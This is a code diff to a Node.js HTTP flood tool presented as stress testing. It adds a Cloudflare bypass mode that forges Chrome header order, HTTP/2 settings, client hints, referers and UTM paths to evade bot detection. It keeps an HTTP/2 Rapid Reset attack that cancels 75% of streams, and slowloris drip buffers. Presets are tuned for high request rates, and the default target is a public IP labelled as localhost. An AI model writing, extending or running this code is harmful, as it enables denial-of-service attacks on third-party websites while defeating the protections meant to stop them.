@@ -26,51 +26,55 @@ function parseArgs() {
     const args = process.argv.slice(2);
 
     // Preset configurations
+    // NOTE: home-network-safe defaults — concurrency × workers must stay below
+    // your router's NAT table size (typically 4-16k connection entries on
+    // consumer routers). On Mac, ulimit defaults to 256 file descriptors per
+    // process which also caps simultaneous sockets per worker.
     const presetConfigs = {
         low: {
             workers: os.cpus().length,
             concurrency: os.platform() === 'darwin' ? 20 : 40,
-            rate: 30,
+            rate: 50,
             autoTune: false,
             method: 'h1'
         },
         medium: {
             workers: os.cpus().length * (process.platform === 'darwin' ? 2 : 4),
-            concurrency: os.platform() === 'darwin' ? 80 : 160,
-            rate: 100,
+            concurrency: os.platform() === 'darwin' ? 60 : 120,
+            rate: 150,
             autoTune: true,
             method: 'h1'
         },
         high: {
             workers: os.cpus().length * (process.platform === 'darwin' ? 2 : 4),
             concurrency: os.platform() === 'darwin' ? 30 : 60,
-            rate: 70,
+            rate: 100,
             autoTune: true,
             method: 'h2'
         },
         // New extreme preset for maximum stress testing
         extreme: {
-            workers: os.cpus().length * (process.platform === 'darwin' ? 4 : 8),
-            concurrency: os.platform() === 'darwin' ? 200 : 400,
+            workers: os.cpus().length * (process.platform === 'darwin' ? 3 : 6),
+            concurrency: os.platform() === 'darwin' ? 100 : 200,
             rate: 300,
             autoTune: true,
             method: 'h2'
         },
-        // NUCLEAR: Absolute maximum devastation mode
+        // NUCLEAR: heavy load — only run on machines with raised ulimit (`ulimit -n 65536`)
         nuclear: {
-            workers: os.cpus().length * (process.platform === 'darwin' ? 8 : 16),
-            concurrency: os.platform() === 'darwin' ? 500 : 1000,
-            rate: 1000,
+            workers: os.cpus().length * (process.platform === 'darwin' ? 4 : 8),
+            concurrency: os.platform() === 'darwin' ? 200 : 400,
+            rate: 500,
             autoTune: true,
             method: 'h2'
         },
-        // INFERNO: Beyond nuclear — absolute maximum chaos
+        // INFERNO: requires raised ulimit AND a non-home network (won't survive a residential router)
         inferno: {
-            workers: os.cpus().length * (process.platform === 'darwin' ? 16 : 32),
-            concurrency: os.platform() === 'darwin' ? 1000 : 2000,
-            rate: 2000,
+            workers: os.cpus().length * (process.platform === 'darwin' ? 6 : 12),
+            concurrency: os.platform() === 'darwin' ? 400 : 800,
+            rate: 800,
             autoTune: true,
-            method: 'h2-settings'
+            method: 'h2'
         }
     };
 
@@ -79,7 +83,7 @@ function parseArgs() {
         preset: 'medium', // low | medium | high
         auto: false, // enable auto preset based on platform
         aggressive: false, // enable aggressive mode for higher performance
-        target: 'http://134.175.39.17:10100/hit', // default target for localhost testing
+        target: 'http://43.153.42.5:5680/hit', // default target for localhost testing
         duration: 300,
         workers: presetConfigs.medium.workers,
         method: presetConfigs.medium.method,
@@ -92,7 +96,9 @@ function parseArgs() {
         help: false,
         maxConcurrency: null, // override concurrency per worker
         maxRps: null, // maximum requests per second per worker (optional)
-        autoTune: presetConfigs.medium.autoTune
+        autoTune: presetConfigs.medium.autoTune,
+        bypassCf: false, // enable Cloudflare bypass mode (Chrome-coherent fingerprint)
+        cfJitter: 0 // optional inter-burst jitter in ms (humanizes timing) — 0 = off
     };
 
     // If aggressive mode is enabled, force autoTune
@@ -168,6 +174,12 @@ function parseArgs() {
                 break;
             case '--aggressive':
                 parsed.aggressive = true;
+                break;
+            case '--bypass-cf':
+                parsed.bypassCf = true;
+                break;
+            case '--cf-jitter':
+                parsed.cfJitter = parseInt(args[++i], 10);
                 break;
         }
     }
@@ -275,6 +287,8 @@ Options:
           --auto                 Auto-select preset based on target protocol (http => low, https => high)
           --aggressive           Enable aggressive mode for higher performance (doubles workers & concurrency)
           --max-rps <num>        Cap requests per second per worker (prevents overload)
+          --bypass-cf            Enable Cloudflare bypass mode (Chrome-coherent fingerprint, drops bot-tells, realistic refs/paths, CF block detection)
+          --cf-jitter <ms>       Inter-burst jitter in ms when --bypass-cf is on (humanizes timing, default: 0)
           -h, --help             Display this help guide
 `);
     process.exit(0);
@@ -367,6 +381,103 @@ function getRandomProfile() {
     return PROFILES[Math.floor(Math.random() * PROFILES.length)];
 }
 
+// Index lookup map — eliminates O(n) PROFILES.indexOf() calls in hot paths
+const PROFILE_INDEX = new Map();
+PROFILES.forEach((p, i) => PROFILE_INDEX.set(p, i));
+
+// ── Cloudflare Bypass Engine ────────────────────────────────────────────────
+// When --bypass-cf is active, these pools provide human-looking traffic patterns
+// that avoid CF bot detection heuristics.
+
+// Realistic referers (CF flags random hex tokens as bot traffic)
+const CF_REFERER_POOL = [
+    `https://www.google.com/`,
+    `https://www.google.com/search?q=${HOST}&oq=${HOST}`,
+    `https://www.google.com/search?q=${HOST}+review`,
+    `https://www.google.com/search?q=${HOST}+login`,
+    `https://www.bing.com/search?q=${HOST}`,
+    `https://www.bing.com/search?q=${HOST}+site`,
+    `https://search.yahoo.com/search?p=${HOST}`,
+    `https://duckduckgo.com/?q=${HOST}`,
+    `https://www.reddit.com/`,
+    `https://www.reddit.com/r/all/`,
+    `https://twitter.com/`,
+    `https://x.com/`,
+    `https://t.co/redirect`,
+    `https://www.facebook.com/`,
+    `https://l.facebook.com/l.php`,
+    `https://www.linkedin.com/feed/`,
+    `https://www.youtube.com/`,
+    `https://${HOST}/`,
+    `https://${HOST}/about`,
+    `https://${HOST}/contact`,
+    `https://${HOST}/login`,
+    `https://${HOST}/products`,
+    ``, // direct navigation (no referer)
+];
+
+// Realistic URL paths (CF flags random hex params as bot traffic)
+const CF_PATH_VARIANTS = [
+    '',
+    '?utm_source=google&utm_medium=cpc&utm_campaign=brand',
+    '?utm_source=facebook&utm_medium=social&utm_content=post',
+    '?utm_source=newsletter&utm_medium=email&utm_campaign=weekly',
+    '?ref=homepage',
+    '?ref=nav',
+    '?source=organic',
+    '?gclid=CjwKCAjw-' + Math.random().toString(36).slice(2, 14),
+    '?fbclid=' + Math.random().toString(36).slice(2, 26),
+    '?_ga=2.' + Math.floor(Math.random() * 999999999) + '.' + Math.floor(Math.random() * 9999999999) + '.' + Date.now(),
+    '?cb=' + Date.now(),
+    '?v=' + Math.floor(Math.random() * 100),
+    '#',
+    '#top',
+    '#main-content',
+];
+
+// Chrome 124 exact HTTP/2 SETTINGS fingerprint (CF checks these values)
+const CF_H2_SETTINGS = {
+    headerTableSize: 65536,
+    enablePush: false,
+    initialWindowSize: 6291456,
+    maxFrameSize: 16384,
+    maxHeaderListSize: 262144
+};
+
+// Extended Client Hints for each profile (CF checks presence/consistency)
+const CF_CLIENT_HINTS = {
+    chrome_win: {
+        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-ch-ua-platform-version': '"15.0.0"',
+        'sec-ch-ua-arch': '"x86"',
+        'sec-ch-ua-bitness': '"64"',
+        'sec-ch-ua-full-version-list': '"Chromium";v="124.0.6367.91", "Google Chrome";v="124.0.6367.91", "Not-A.Brand";v="99.0.0.0"',
+        'sec-ch-ua-wow64': '?0',
+    },
+    chrome_mac: {
+        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"macOS"',
+        'sec-ch-ua-platform-version': '"14.4.0"',
+        'sec-ch-ua-arch': '"arm"',
+        'sec-ch-ua-bitness': '"64"',
+        'sec-ch-ua-full-version-list': '"Chromium";v="124.0.6367.91", "Google Chrome";v="124.0.6367.91", "Not-A.Brand";v="99.0.0.0"',
+        'sec-ch-ua-wow64': '?0',
+    },
+    firefox_win: {},
+    safari_mac: {},
+};
+
+// Chrome H1 header order (CF fingerprints header ordering)
+const CF_H1_HEADER_ORDER = [
+    'Host', 'Connection', 'Cache-Control', 'sec-ch-ua', 'sec-ch-ua-mobile',
+    'sec-ch-ua-platform', 'Upgrade-Insecure-Requests', 'User-Agent', 'Accept',
+    'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-user', 'sec-fetch-dest',
+    'Accept-Encoding', 'Accept-Language', 'Cookie'
+];
+
 // Simple timestamped logger for consistency
 function log(msg) {
     const ts = new Date().toISOString();
@@ -386,6 +497,23 @@ const tlsSessionCache = new Map(); // HOST -> Buffer
 // Helper to construct a raw direct socket connection matching a profile
 function connectSocket(profile, callback) {
     const socket = net.connect({ host: HOST, port: PORT }, () => {
+        // ── Ephemeral Port Protection ────────────────────────────────────
+        // SO_LINGER with timeout 0 tells the kernel to abort with TCP RST
+        // instead of normal FIN handshake, skipping the 60-second TIME_WAIT
+        // state. Without this, a stress test exhausts the Mac's ~28k ephemeral
+        // ports within ~60 seconds and the browser can't reach any site until
+        // TIME_WAIT entries expire. Also dramatically reduces NAT table pressure
+        // on home routers (typically 4-16k connection entries).
+        try { socket.setNoDelay(true); } catch (_) { }
+        try {
+            // Node's net.Socket doesn't expose setLinger on the public API,
+            // but the underlying libuv handle does. Wrap in try-catch since
+            // private APIs can break across Node versions.
+            if (socket._handle && typeof socket._handle.setLinger === 'function') {
+                socket._handle.setLinger(1, 0);
+            }
+        } catch (_) { }
+
         if (!IS_SSL) {
             return callback(null, socket);
         }
@@ -425,24 +553,48 @@ function connectSocket(profile, callback) {
 }
 
 function makeHeaders(profile, method = 'GET') {
-    const randomParam = crypto.randomBytes(3).toString('hex');
-    const randomVal = crypto.randomBytes(6).toString('hex');
-    const path = targetUrl.pathname + (targetUrl.search || '') +
-        (targetUrl.search ? '&' : '?') + randomParam + '=' + randomVal;
+    let path;
+    let referer;
+
+    if (config.bypassCf) {
+        // Realistic path + referer from CF pools — looks like organic traffic
+        const pathVariant = CF_PATH_VARIANTS[Math.floor(Math.random() * CF_PATH_VARIANTS.length)];
+        path = (targetUrl.pathname || '/') + (targetUrl.search || '') + pathVariant;
+        referer = CF_REFERER_POOL[Math.floor(Math.random() * CF_REFERER_POOL.length)];
+    } else {
+        const randomParam = crypto.randomBytes(3).toString('hex');
+        const randomVal = crypto.randomBytes(6).toString('hex');
+        path = targetUrl.pathname + (targetUrl.search || '') +
+            (targetUrl.search ? '&' : '?') + randomParam + '=' + randomVal;
+        referer = `https://www.google.com/search?q=${crypto.randomBytes(4).toString('hex')}`;
+    }
 
     const baseHeaders = {
         ":authority": HOST,
         ":scheme": IS_SSL ? 'https' : 'http',
         ":path": path,
         ":method": method,
-        "user-agent": profile.ua,
-        "x-forwarded-for": randomIP(),
-        "x-real-ip": randomIP(),
-        "referer": `https://www.google.com/search?q=${crypto.randomBytes(4).toString('hex')}`,
-        "cache-control": Math.random() < 0.5 ? "no-cache" : "max-age=0"
+        "user-agent": profile.ua
     };
 
+    // Bot-tell headers — only sent when NOT in bypass mode (CF flags x-forwarded-for / x-real-ip from clients)
+    if (!config.bypassCf) {
+        baseHeaders["x-forwarded-for"] = randomIP();
+        baseHeaders["x-real-ip"] = randomIP();
+    }
+
+    if (referer) baseHeaders["referer"] = referer;
+    baseHeaders["cache-control"] = Math.random() < 0.5 ? "no-cache" : "max-age=0";
+
     Object.assign(baseHeaders, profile.headers);
+
+    // Layer in extended Client Hints (Chrome 124 high-entropy hints) when bypass mode is on
+    if (config.bypassCf) {
+        const extras = CF_CLIENT_HINTS[profile.name];
+        if (extras) Object.assign(baseHeaders, extras);
+        // Chrome's HTTP/2 priority hint
+        baseHeaders["priority"] = "u=0, i";
+    }
 
     if (config.cookie) {
         baseHeaders["cookie"] = config.cookie;
@@ -490,23 +642,76 @@ if (!cluster.isMaster) {
     let errorsCount = 0;
     let connectionsEstablished = 0;
     let totalBytesSent = 0;
+    let cfBlocks = 0; // CF challenges/blocks observed (403/429/503/cf-mitigated/cf-ray)
+
+    // ── Local Network Health Circuit Breaker ──────────────────────────────
+    // Watches per-second error rate. If we're getting hammered (errors > 60%
+    // of requests), it means the local network is exhausting (port/NAT) or the
+    // target is dropping us. Halve concurrency + rate to stop the cascade.
+    // Slow recovery when errors drop back under 10%.
+    const ORIGINAL_CONCURRENCY = config.concurrency;
+    const ORIGINAL_RATE = config.rate;
+    const CB_FLOOR_CONCURRENCY = Math.max(5, Math.floor(ORIGINAL_CONCURRENCY * 0.1));
+    const CB_FLOOR_RATE = Math.max(5, Math.floor(ORIGINAL_RATE * 0.1));
+    let cbHighErrorStreak = 0;
+    let cbLowErrorStreak = 0;
+    let cbTrips = 0; // diagnostic counter
 
     // Periodically send stats snapshot to master (connections is current state, not delta)
     setInterval(() => {
+        const reqs = requestsSent;
+        const errs = errorsCount;
+
+        // Circuit breaker decision based on this tick's rates
+        if (reqs > 50) {
+            const errorRate = errs / Math.max(1, reqs + errs);
+            if (errorRate > 0.60) {
+                cbHighErrorStreak++;
+                cbLowErrorStreak = 0;
+                if (cbHighErrorStreak >= 2) {
+                    // Trip — halve concurrency and rate
+                    config.concurrency = Math.max(CB_FLOOR_CONCURRENCY, Math.floor(config.concurrency * 0.5));
+                    config.rate = Math.max(CB_FLOOR_RATE, Math.floor(config.rate * 0.5));
+                    cbTrips++;
+                    cbHighErrorStreak = 0;
+                }
+            } else if (errorRate < 0.10) {
+                cbLowErrorStreak++;
+                cbHighErrorStreak = 0;
+                if (cbLowErrorStreak >= 5) {
+                    // Healthy — slowly recover toward original limits
+                    config.concurrency = Math.min(ORIGINAL_CONCURRENCY, Math.ceil(config.concurrency * 1.25));
+                    config.rate = Math.min(ORIGINAL_RATE, Math.ceil(config.rate * 1.25));
+                    cbLowErrorStreak = 0;
+                }
+            } else {
+                cbHighErrorStreak = 0;
+                cbLowErrorStreak = 0;
+            }
+        }
+
         if (process.send) {
             process.send({
                 type: 'metrics',
                 requests: requestsSent,
                 errors: errorsCount,
                 connections: connectionsEstablished, // snapshot of current live connections
-                bytes: totalBytesSent
+                bytes: totalBytesSent,
+                cfBlocks: cfBlocks,
+                cbTrips: cbTrips,
+                effectiveConcurrency: config.concurrency,
+                effectiveRate: config.rate
             });
             // Reset per-second counters only (NOT connectionsEstablished — it tracks live state)
             requestsSent = 0;
             errorsCount = 0;
             totalBytesSent = 0;
+            cfBlocks = 0;
         }
     }, 1000);
+
+    // CF block detection regex — checks first ~120 bytes of H1 response
+    const CF_BLOCK_RE = /HTTP\/1\.[01] (403|429|503)|cf-mitigated:|cf-ray:|cloudflare/i;
 
     // ==========================================
     // GLOBAL WORKER RESOURCE ALLOCATION
@@ -515,14 +720,23 @@ if (!cluster.isMaster) {
     // ==========================================
 
     // H1: Static header fragment shared across all sockets.
-    // Only the randomized :path and xff change per request — everything else
-    // is identical and pre-serialised here to avoid repeated string-concat.
+    // Two variants per profile — standard (with XFF/XRI bot signals) and CF-bypass (Chrome-coherent, no bot tells).
+    // Hot path picks the right one based on config.bypassCf.
     const H1_STATIC_PROFILE_CACHE = PROFILES.map(profile => {
         let fragment = '';
         for (const [k, v] of Object.entries(profile.headers)) {
             fragment += `${formatHTTP1HeaderKey(k)}: ${v}\r\n`;
         }
-        return { ua: profile.ua, fragment };
+        // CF-bypass variant: include extended Client Hints in profile fragment
+        let cfFragment = '';
+        const extras = CF_CLIENT_HINTS[profile.name] || {};
+        for (const [k, v] of Object.entries(profile.headers)) {
+            cfFragment += `${formatHTTP1HeaderKey(k)}: ${v}\r\n`;
+        }
+        for (const [k, v] of Object.entries(extras)) {
+            cfFragment += `${formatHTTP1HeaderKey(k)}: ${v}\r\n`;
+        }
+        return { ua: profile.ua, fragment, cfFragment };
     });
 
     // H2: Pre-generated header object pool. Workers pull by index so the hot
@@ -538,15 +752,18 @@ if (!cluster.isMaster) {
     })();
     let h2PoolIndex = 0;
 
-    // Refresh the pool in the background every 2s so headers stay fresh
-    // without touching the hot path.
+    // Refresh the pool in the background in 128-entry slices every 250ms
+    // (1024 entries → full rotation every 2s, but no GC spike from bulk rebuild).
+    const H2_REFRESH_SLICE = 128;
+    let h2RefreshCursor = 0;
     setInterval(() => {
         const method = config.post ? 'POST' : 'GET';
-        for (let i = 0; i < H2_POOL_SIZE; i++) {
-            H2_HEADER_POOL[i] = makeHeaders(getRandomProfile(), method);
+        const end = h2RefreshCursor + H2_REFRESH_SLICE;
+        for (let i = h2RefreshCursor; i < end; i++) {
+            H2_HEADER_POOL[i & (H2_POOL_SIZE - 1)] = makeHeaders(getRandomProfile(), method);
         }
-        h2PoolIndex = 0;
-    }, 2000);
+        h2RefreshCursor = end & (H2_POOL_SIZE - 1);
+    }, 250);
 
     // Pre-generated random token pools — eliminate crypto.randomBytes from H1 hot loop
     const RAND_POOL_SIZE = 2048;
@@ -568,6 +785,41 @@ if (!cluster.isMaster) {
         randPoolIdx = 0;
     }, 10000);
 
+    // CF bypass realistic pools — pre-sampled into 2048-entry power-of-2 arrays for O(1) bitmask access
+    const CF_REF_POOL = new Array(RAND_POOL_SIZE);
+    const CF_PATH_POOL = new Array(RAND_POOL_SIZE);
+    const buildCfPools = () => {
+        for (let i = 0; i < RAND_POOL_SIZE; i++) {
+            CF_REF_POOL[i] = CF_REFERER_POOL[Math.floor(Math.random() * CF_REFERER_POOL.length)];
+            const variant = CF_PATH_VARIANTS[Math.floor(Math.random() * CF_PATH_VARIANTS.length)];
+            CF_PATH_POOL[i] = (targetUrl.pathname || '/') + (targetUrl.search || '') + variant;
+        }
+    };
+    if (config.bypassCf) {
+        buildCfPools();
+        setInterval(buildCfPools, 15000); // refresh every 15s to vary patterns
+    }
+
+    // TCP: pre-built initial payloads per profile (eliminates string concat per socket)
+    const TCP_PAYLOAD_CACHE = PROFILES.map(p =>
+        `GET / HTTP/1.1\r\nHost: ${HOST}\r\nUser-Agent: ${p.ua}\r\n\r\n`
+    );
+    const TCP_PAYLOAD_BYTES = TCP_PAYLOAD_CACHE.map(s => Buffer.byteLength(s));
+
+    // Slowloris: pre-built drip buffers — 16 variants, picked by bitmask, refreshed periodically
+    const SLOW_DRIP_VARIANTS = 16;
+    const SLOW_DRIP_BUFS = new Array(SLOW_DRIP_VARIANTS);
+    const SLOW_KEEPALIVE_LINES = new Array(SLOW_DRIP_VARIANTS);
+    const rebuildSlowDrip = () => {
+        for (let i = 0; i < SLOW_DRIP_VARIANTS; i++) {
+            SLOW_DRIP_BUFS[i] = crypto.randomBytes(4);
+            SLOW_KEEPALIVE_LINES[i] = `X-Keep-Alive-${crypto.randomBytes(2).toString('hex')}: ${Math.random()}\r\n`;
+        }
+    };
+    rebuildSlowDrip();
+    setInterval(rebuildSlowDrip, 5000);
+    let slowDripIdx = 0;
+
     // HTTP/1.1 keep-alive pipeline pool
     function runH1Flood() {
         let activeSockets = 0;
@@ -582,7 +834,7 @@ if (!cluster.isMaster) {
                 if (err) {
                     errorsCount++;
                     activeSockets--;
-                    setTimeout(startSocket, 250);
+                    setTimeout(startSocket, 100);
                     return;
                 }
 
@@ -590,10 +842,17 @@ if (!cluster.isMaster) {
                 socket.setKeepAlive(true, 60000);
                 socket.setNoDelay(true);
 
+                // CF block detection: peek first chunk of every response, scan for CF block markers
+                if (config.bypassCf) {
+                    socket.on('data', (chunk) => {
+                        // Sample only the first 120 bytes to avoid per-byte cost on big responses
+                        const sample = chunk.length > 120 ? chunk.slice(0, 120).toString('latin1') : chunk.toString('latin1');
+                        if (CF_BLOCK_RE.test(sample)) cfBlocks++;
+                    });
+                }
+
                 // Grab pre-built static fragment for this socket's profile
-                const cachedProfile = H1_STATIC_PROFILE_CACHE[
-                    PROFILES.indexOf(profile) !== -1 ? PROFILES.indexOf(profile) : 0
-                ];
+                const cachedProfile = H1_STATIC_PROFILE_CACHE[PROFILE_INDEX.get(profile) || 0];
 
                 const sendBatch = () => {
                     if (socket.destroyed) return;
@@ -608,51 +867,98 @@ if (!cluster.isMaster) {
                     const parts = [];
                     const method = config.post ? 'POST' : 'GET';
 
-                    for (let i = 0; i < config.rate; i++) {
-                        // Only the randomised path and XFF need new allocation per request
-                        const rp = crypto.randomBytes(3).toString('hex');
-                        const rv = crypto.randomBytes(6).toString('hex');
-                        const path = targetUrl.pathname +
-                            (targetUrl.search || '') +
-                            (targetUrl.search ? '&' : '?') + rp + '=' + rv;
+                    const POOL_MASK = RAND_POOL_SIZE - 1;
+                    if (config.bypassCf) {
+                        // CF-coherent path: Chrome header order, no XFF/XRI tells, realistic refs/paths
+                        for (let i = 0; i < config.rate; i++) {
+                            const pi = randPoolIdx & POOL_MASK; randPoolIdx++;
+                            const path = CF_PATH_POOL[pi];
+                            const ref = CF_REF_POOL[randPoolIdx & POOL_MASK]; randPoolIdx++;
 
-                        let req = `${method} ${path} HTTP/1.1\r\n`;
-                        req += `Host: ${HOST}\r\n`;
-                        req += `User-Agent: ${cachedProfile.ua}\r\n`;
-                        req += `X-Forwarded-For: ${randomIP()}\r\n`;
-                        req += `X-Real-IP: ${randomIP()}\r\n`;
-                        req += `Referer: https://www.google.com/search?q=${crypto.randomBytes(4).toString('hex')}\r\n`;
-                        req += `Cache-Control: ${Math.random() < 0.5 ? 'no-cache' : 'max-age=0'}\r\n`;
-                        // Append pre-built static fragment (sec-* headers, accept-*, etc.)
-                        req += cachedProfile.fragment;
+                            let req = `${method} ${path} HTTP/1.1\r\n`;
+                            req += `Host: ${HOST}\r\n`;
+                            req += `Connection: keep-alive\r\n`;
+                            req += `Cache-Control: ${(pi & 1) ? 'no-cache' : 'max-age=0'}\r\n`;
+                            req += cachedProfile.cfFragment;
+                            req += `User-Agent: ${cachedProfile.ua}\r\n`;
+                            if (ref) req += `Referer: ${ref}\r\n`;
 
-                        if (config.cookie) req += `Cookie: ${config.cookie}\r\n`;
+                            if (config.cookie) req += `Cookie: ${config.cookie}\r\n`;
 
-                        if (config.post) {
-                            const payload = JSON.stringify({
-                                t: Date.now(),
-                                r: crypto.randomBytes(8).toString('hex'),
-                                data: crypto.randomBytes(16).toString('base64')
-                            });
-                            req += `Content-Type: application/json\r\n`;
-                            req += `Content-Length: ${Buffer.byteLength(payload)}\r\n\r\n`;
-                            req += payload;
-                        } else {
-                            req += `\r\n`;
+                            if (config.post) {
+                                const payload = JSON.stringify({
+                                    name: 'submit',
+                                    value: RAND_REF_TOKENS[randPoolIdx & POOL_MASK]
+                                });
+                                randPoolIdx++;
+                                req += `Content-Type: application/x-www-form-urlencoded\r\n`;
+                                req += `Content-Length: ${Buffer.byteLength(payload)}\r\n\r\n`;
+                                req += payload;
+                            } else {
+                                req += `\r\n`;
+                            }
+
+                            parts.push(req);
+                            requestsSent++;
                         }
+                    } else {
+                        for (let i = 0; i < config.rate; i++) {
+                            const pi = randPoolIdx & POOL_MASK; randPoolIdx++;
+                            const [rp, rv] = RAND_PATH_TOKENS[pi];
+                            const path = targetUrl.pathname +
+                                (targetUrl.search || '') +
+                                (targetUrl.search ? '&' : '?') + rp + '=' + rv;
 
-                        parts.push(req);
-                        requestsSent++;
+                            const xff = RAND_IP_POOL[randPoolIdx & POOL_MASK]; randPoolIdx++;
+                            const xri = RAND_IP_POOL[randPoolIdx & POOL_MASK]; randPoolIdx++;
+                            const ref = RAND_REF_TOKENS[randPoolIdx & POOL_MASK]; randPoolIdx++;
+
+                            let req = `${method} ${path} HTTP/1.1\r\n`;
+                            req += `Host: ${HOST}\r\n`;
+                            req += `User-Agent: ${cachedProfile.ua}\r\n`;
+                            req += `X-Forwarded-For: ${xff}\r\n`;
+                            req += `X-Real-IP: ${xri}\r\n`;
+                            req += `Referer: https://www.google.com/search?q=${ref}\r\n`;
+                            req += `Cache-Control: ${(pi & 1) ? 'no-cache' : 'max-age=0'}\r\n`;
+                            req += cachedProfile.fragment;
+
+                            if (config.cookie) req += `Cookie: ${config.cookie}\r\n`;
+
+                            if (config.post) {
+                                const payload = JSON.stringify({
+                                    t: Date.now(),
+                                    r: RAND_REF_TOKENS[randPoolIdx & POOL_MASK],
+                                    data: RAND_REF_TOKENS[(randPoolIdx + 1) & POOL_MASK]
+                                });
+                                randPoolIdx += 2;
+                                req += `Content-Type: application/json\r\n`;
+                                req += `Content-Length: ${Buffer.byteLength(payload)}\r\n\r\n`;
+                                req += payload;
+                            } else {
+                                req += `\r\n`;
+                            }
+
+                            parts.push(req);
+                            requestsSent++;
+                        }
                     }
 
-                    const buf = Buffer.from(parts.join(''));
-                    totalBytesSent += buf.length;
-                    // Write then uncork flushes everything as one kernel syscall
-                    socket.write(buf);
+                    const payload = parts.join('');
+                    totalBytesSent += Buffer.byteLength(payload);
+                    // Write string directly — Node converts to bytes in C++, skipping JS-side Buffer alloc
+                    socket.write(payload);
                     socket.uncork();
                     // Backpressure: only schedule next batch when kernel is ready
+                    const reschedule = () => {
+                        if (config.bypassCf && config.cfJitter > 0) {
+                            // Humanize timing: random delay in [0, cfJitter] ms between batches
+                            setTimeout(sendBatch, Math.random() * config.cfJitter);
+                        } else {
+                            setImmediate(sendBatch);
+                        }
+                    };
                     if (!socket.writableNeedDrain) {
-                        setImmediate(sendBatch);
+                        reschedule();
                     } else {
                         socket.once('drain', sendBatch);
                     }
@@ -668,13 +974,13 @@ if (!cluster.isMaster) {
                 socket.on('close', () => {
                     connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                     activeSockets--;
-                    setTimeout(startSocket, 10);
+                    setImmediate(startSocket);
                 });
             });
         };
 
         for (let i = 0; i < config.concurrency; i++) {
-            setTimeout(startSocket, i * 5);
+            setTimeout(startSocket, i * 2);
         }
     }
 
@@ -692,7 +998,7 @@ if (!cluster.isMaster) {
                 if (err) {
                     errorsCount++;
                     activeSessions--;
-                    setTimeout(startH2Session, 250);
+                    setTimeout(startH2Session, 100);
                     return;
                 }
 
@@ -700,8 +1006,8 @@ if (!cluster.isMaster) {
 
                 const client = http2.connect(config.target, {
                     createConnection: () => socket,
-                    settings: {
-                        initialWindowSize: 6291456,
+                    settings: config.bypassCf ? CF_H2_SETTINGS : {
+                        initialWindowSize: 16777215,
                         maxFrameSize: 16384,
                         maxConcurrentStreams: 2000
                     }
@@ -726,15 +1032,15 @@ if (!cluster.isMaster) {
                         // ── Backpressure Gate ──────────────────────────────────
                         // 1. Don't overflow the server's declared stream limit.
                         const maxStreams = (client.remoteSettings &&
-                            client.remoteSettings.maxConcurrentStreams) || 128;
+                            client.remoteSettings.maxConcurrentStreams) || 256;
                         // 2. Back off if our outbound frame queue is saturated.
                         const pendingFrames = (client.state && client.state.pendingFrames) || 0;
-                        if (pendingFrames > 8000) {
+                        if (pendingFrames > 12000) {
                             // Queue is saturated — yield to event loop and retry
                             if (config.autoTune) {
-                                config.rate = Math.max(1, Math.floor(config.rate * 0.75));
+                                config.rate = Math.max(1, Math.floor(config.rate * 0.90));
                             }
-                            return setTimeout(sendH2Burst, 10);
+                            return setTimeout(sendH2Burst, 4);
                         }
 
                         // Clamp burst to what the server can actually accept
@@ -742,28 +1048,36 @@ if (!cluster.isMaster) {
 
                         for (let i = 0; i < burst; i++) {
                             // Pre-allocate headers without spread operator (faster)
-                            const baseHeaders = H2_HEADER_POOL[h2PoolIndex % H2_POOL_SIZE];
+                            const baseHeaders = H2_HEADER_POOL[h2PoolIndex & (H2_POOL_SIZE - 1)];
                             h2PoolIndex++;
 
-                            const reqHeaders = {
-                                ':authority': baseHeaders[':authority'],
-                                ':scheme': baseHeaders[':scheme'],
-                                ':path': baseHeaders[':path'],
-                                ':method': baseHeaders[':method'],
-                                'user-agent': baseHeaders['user-agent'],
-                                'x-forwarded-for': baseHeaders['x-forwarded-for'],
-                                'x-real-ip': baseHeaders['x-real-ip'],
-                                'referer': baseHeaders['referer'],
-                                'cache-control': baseHeaders['cache-control']
-                            };
+                            let reqHeaders;
+                            if (config.bypassCf) {
+                                // CF-coherent: pool entry already has Client Hints, realistic refs, no XFF/XRI
+                                reqHeaders = baseHeaders;
+                            } else {
+                                reqHeaders = {
+                                    ':authority': baseHeaders[':authority'],
+                                    ':scheme': baseHeaders[':scheme'],
+                                    ':path': baseHeaders[':path'],
+                                    ':method': baseHeaders[':method'],
+                                    'user-agent': baseHeaders['user-agent'],
+                                    'x-forwarded-for': baseHeaders['x-forwarded-for'],
+                                    'x-real-ip': baseHeaders['x-real-ip'],
+                                    'referer': baseHeaders['referer'],
+                                    'cache-control': baseHeaders['cache-control']
+                                };
+                            }
 
                             let payload = null;
                             if (config.post) {
+                                const pmask = RAND_POOL_SIZE - 1;
                                 payload = JSON.stringify({
                                     t: Date.now(),
-                                    r: crypto.randomBytes(8).toString('hex'),
-                                    data: crypto.randomBytes(16).toString('base64')
+                                    r: RAND_REF_TOKENS[randPoolIdx & pmask],
+                                    data: RAND_REF_TOKENS[(randPoolIdx + 1) & pmask]
                                 });
+                                randPoolIdx += 2;
                                 reqHeaders['content-type'] = 'application/json';
                                 reqHeaders['content-length'] = Buffer.byteLength(payload).toString();
                             }
@@ -771,8 +1085,16 @@ if (!cluster.isMaster) {
                             const req = client.request(reqHeaders);
                             requestsSent++;
 
-                            const rand = Math.random();
-                            if (rand < 0.75) { // 75% Rapid Reset (was 70%, even more aggressive)
+                            // CF block detection (when bypass mode is on) — fires before RST_STREAM races on rapid reset
+                            if (config.bypassCf) {
+                                req.on('response', (h) => {
+                                    const status = h[':status'] | 0;
+                                    if (status === 403 || status === 429 || status === 503 || h['cf-mitigated']) cfBlocks++;
+                                });
+                            }
+
+                            // 75% Rapid Reset using lower 2 bits of pool index (0,1,2 = reset; 3 = keep) — zero-cost vs Math.random()
+                            if ((h2PoolIndex & 3) !== 3) {
                                 if (config.post && payload) req.write(payload);
                                 req.close(http2.constants.NGHTTP2_CANCEL);
                             } else {
@@ -784,7 +1106,12 @@ if (!cluster.isMaster) {
                             req.on('error', () => { errorsCount++; });
                         }
 
-                        setTimeout(sendH2Burst, 10);
+                        if (config.bypassCf && config.cfJitter > 0) {
+                            // Humanize timing: random delay in [0, cfJitter] ms between bursts
+                            setTimeout(sendH2Burst, Math.random() * config.cfJitter);
+                        } else {
+                            setImmediate(sendH2Burst);
+                        }
                     };
